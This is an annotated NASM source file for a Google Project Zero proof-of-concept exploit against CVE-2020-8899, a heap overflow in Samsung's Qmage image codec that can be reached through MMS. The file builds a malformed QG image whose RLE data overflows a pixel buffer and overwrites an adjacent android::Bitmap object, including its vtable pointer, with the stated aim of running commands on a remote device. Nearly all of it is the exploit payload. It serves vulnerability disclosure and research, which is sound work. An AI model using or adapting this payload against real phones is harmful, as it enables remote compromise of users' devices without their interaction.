;
; Samsung Qmage codec exploit proof-of-concept for executing an arbitrary
; command on a remote affected device via an MMS processed by the default
; Samsung Messages app.
;
; Author:  Mateusz Jurczyk, Google Project Zero
; Date:    August 2020
; Bug:     CVE-2020-8899 (crash e418c0496cb1babf0eba13026f4d1504)
; Fixed:   Samsung May 2020 Security Bulletin (SVE-2020-16747)
;

_QMG_HEADER:

  db 'QG'              ; Signature
  db 0x01, 0x02, 0x01  ; Version 1.2.1 (equivalent to 2.0)
  db 0x30              ; Flags: PREMULTIPLIED | INDEXED_COLOR
  db 0x64              ; Quality: 100 (best)
  dw 0x0004            ; Width: 4
  dw 0x000A            ; Height: 10
  db 0x00              ; Extra header length: 0

_COLOR_TABLE_HEADER:

  db 0x25              ; Number of colors: 37 (38 expected by the codec)
  dw 0x00A0            ; Length of the compressed color table: 0xA0

_COMPRESSED_COLOR_TABLE:

  incbin "color_table.bin"

_COMPRESSED_COLOR_TABLE_PADDING:

  times 0xA0 - (_COMPRESSED_COLOR_TABLE_PADDING - _COMPRESSED_COLOR_TABLE) db 0x00

_DATA_STREAM_START:

  ; Required marker bytes.
  db 0xFF, 0x00

  ; Compression type: Run Length Encoding
  db 0x06

_RLE_STREAM_START:

  ; Length of the overall RLE stream in bytes (excluding this DWORD).
  dd (_RLE_STREAM_END - _RLE_STREAM_START - 4)

  ; Number of different, subsequent bytes written to the output buffer during
  ; decompression, which is somewhere between 160 and 320 in our case, depending
  ; on how many bytes of the adjacent object we wish to overwrite.
  dd (_RLE_DATA_END - _RLE_DATA_START)

_RLE_DATA_START:

  ; ============================================================================
  ; Contents of the 160-byte legitimate pixel buffer.
  ; ============================================================================

  ;
  ; 40 bytes of consecutive color indexes.
  ;
  db 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07
  db 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
  db 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17
  db 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f
  db 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x25, 0x25

  ;
  ; 120 bytes to fill out the 160-byte allocation before overwriting the adjacent
  ; object. These bytes will be discarded when translating indexes into RGBA in
  ; PVcodecDecoderIndex, after the RLE decompression.
  ;
  times 120 db 0xcc

  ; ============================================================================
  ; Start of the overwritten android::Bitmap object
  ; ============================================================================

  ; class ANDROID_API Bitmap : public SkPixelRef {
  dq BITMAP_VTABLE_ADDR       ; /* +0x00 */    void *vtable;
                              ;                class SK_API SkRefCntBase {
  dd 0x1                      ; /* +0x08 */        mutable std::atomic<int32_t> fRefCnt;
                              ;                }
                              ;                class SK_API SkPixelRef : public SkRefCnt {
  dd 0x41414141               ; /* +0x0C */        int                 fWidth;
  dd 0x41414141               ; /* +0x10 */        int                 fHeight;
  dd 0x41414141               ; /* +0x14 */        <padding>
  dq 0x0                      ; /* +0x18 */        void*               fPixels;
  dq 0x4141414141414141       ; /* +0x20 */        size_t              fRowBytes;
  dd 0x0                      ; /* +0x28 */        mutable std::atomic<uint32_t> fTaggedGenID;
  dd 0x0                      ; /* +0x2c */        <padding>
                              ;                    SkIDChangeListener::List fGenIDChangeListeners {
                              ;                       SkMutex fMutex {
  dd 0x0                      ; /* +0x30 */             std::atomic<int> fCount;
  db 0x0                      ; /* +0x34 */             SkOnce           fOSSemaphoreOnce;
  times 3 db 0x0              ; /* +0x35 */             <padding>
  dq 0x0                      ; /* +0x38 */             OSSemaphore*     fOSSemaphore;
                              ;                       }
                              ;                       SkTDArray<SkIDChangeListener*> fListeners {
  dq 0x0                      ; /* +0x40 */             SkIDChangeListener*      fArray;
  dd 0x0                      ; /* +0x48 */             int     fReserve;
  dd 0x0                      ; /* +0x4C */             int     fCount;
                              ;                       }
                              ;                    }
  db 0x0                      ; /* +0x50 */        std::atomic<bool> fAddedToCache;
  db 0x0                      ; /* +0x51 */        enum Mutability {
                              ; /* +0x51 */            kMutable,
                              ; /* +0x51 */            kTemporarilyImmutable,
                              ; /* +0x51 */            kImmutable,
                              ; /* +0x51 */        } fMutability : 8;
  times 6 db 0x0              ; /* +0x52 */        <padding>
                              ;                SkImageInfo mInfo {
  dq 0x0                      ; /* +0x58 */      sk_sp<SkColorSpace> fColorSpace;
  dd 0x41414141               ; /* +0x60 */      int                 fWidth;
  dd 0x41414141               ; /* +0x64 */      int                 fHeight;
  dd 0x41414141               ; /* +0x68 */      SkColorType         fColorType;
  dd 0x41414141               ; /* +0x6C */      SkAlphaType         fAlphaType;
                              ;                }
  dd 0x00                     ; /* +0x70 */    const PixelStorageType mPixelStorageType;

_RLE_DATA_END:
_RLE_LENGTHS_START:

; An encoded 0xAA byte denotes four single-byte runs in the stream.
times ((_RLE_DATA_END - _RLE_DATA_START) / 4) db 0xAA

_RLE_LENGTHS_END:
_RLE_STREAM_END:

; Trailing marker found in valid QG files.
db 0xFF, 0x00
